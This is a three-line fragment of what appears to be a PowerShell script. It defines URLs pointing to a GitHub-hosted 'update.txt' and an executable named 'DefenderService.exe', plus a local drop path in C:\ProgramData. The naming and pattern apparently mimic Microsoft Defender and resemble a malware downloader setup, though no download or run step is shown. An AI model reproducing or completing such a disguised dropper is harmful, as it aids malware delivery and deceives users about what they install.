...
$url_text = 'https://raw.githubusercontent.com/bossaa11/test/main/update.txt'
$url_exe = "https://github.com/bossaa11/test/raw/main/DefenderService.exe"
$file_exe = "C:\ProgramData\DefenderService.exe"
